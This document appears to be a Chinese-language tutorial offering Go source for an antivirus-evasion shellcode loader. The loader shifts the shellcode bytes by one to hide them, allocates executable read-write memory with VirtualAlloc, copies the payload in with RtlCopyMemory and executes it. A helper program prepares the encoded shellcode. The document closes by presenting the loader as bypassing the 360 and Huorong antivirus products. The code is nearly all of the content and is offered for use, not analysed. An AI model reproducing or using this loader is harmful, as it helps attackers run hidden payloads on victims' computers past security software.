# 1 加减一 之 360、火绒 64位 1M
## 免杀加载器代码
### 加载器代码
    package main
    import (
        "fmt"
        "syscall"
        "unsafe"
    )
    const (
        MEM_COMMIT             = 0x1000
        MEM_RESERVE            = 0x2000
        PAGE_EXECUTE_READWRITE = 0x40 // 区域可以执行代码，应用程序可以读写该区域。
        KEY_1                  = 55
        KEY_2                  = 66
    )
    var (
        kernel32      = syscall.MustLoadDLL("kernel32.dll")   // kernel32.dll它控制着系统的内存管理、数据的输入输出操作和中断处理
        ntdll         = syscall.MustLoadDLL("ntdll.dll")      // ntdll.dll描述了windows本地NTAPI的接口
        VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc") // VirtualAlloc申请内存空间
        RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")   // RtlCopyMemory非重叠内存区域的复制
    )
    func main() { // 生成的shellcode值+1
        xor_shellcode := []byte{ "shellcode+1" }
        var shellcode []byte
        for i := 0; i < len(xor_shellcode); i++ {
            if xor_shellcode[i] == 255 {
                shellcode = append(shellcode, xor_shellcode[i])
            } else {
                shellcode = append(shellcode, xor_shellcode[i]-1) //^KEY_1^KEY_2)    递归shellcode-1还原
            }
        }
        addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE) // 为shellcode申请内存空间
        if err != nil && err.Error() != "The operation completed successfully." {
            fmt.Println("error------------------------------")
            fmt.Println(err.Error())
        }
        _, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode))) // 将shellcode内存复制到申请出来的内存空间中
        if err != nil && err.Error() != "The operation completed successfully." {
            fmt.Println(err.Error())
        }
        syscall.Syscall(addr, 0, 0, 0, 0)
    }
    // uintptr一个足够大的无符号整型， 用来表示任意地址。
    // MEM_COMMIT标志将在页面大小边界上提交页面,而使用MEM_RESERVE或MEM_RESERVE | MEM_COMMIT将在大于页面大小的边界上保留或保留提交页面。
### 辅助代码（特定格式shellcode生成）
Shellcode+1并输出
    package main
    import (
        "encoding/hex"
        "fmt"
    )
    func main() {
        xor_shellcode := []byte{ "原始shellcode" }
        var js int = 0
        var tmp string
        var shellcode []byte
        for i := 0; i < len(xor_shellcode); i++ {
            if xor_shellcode[i] == 255 {
                shellcode = append(shellcode, xor_shellcode[i])
            } else {
                shellcode = append(shellcode, xor_shellcode[i]+1) //^KEY_1^KEY_2)    递归shellcode+1
            }
        }
        str := hex.EncodeToString(shellcode)
        for j := 0; j < len(str)/2; j = j + 1 {
            tmp = tmp + ",0x" + str[js:js+2]
            js = js + 2
        }
        fmt.Println(tmp)
    }
## 免杀效果
###
火绒免杀
### 360免杀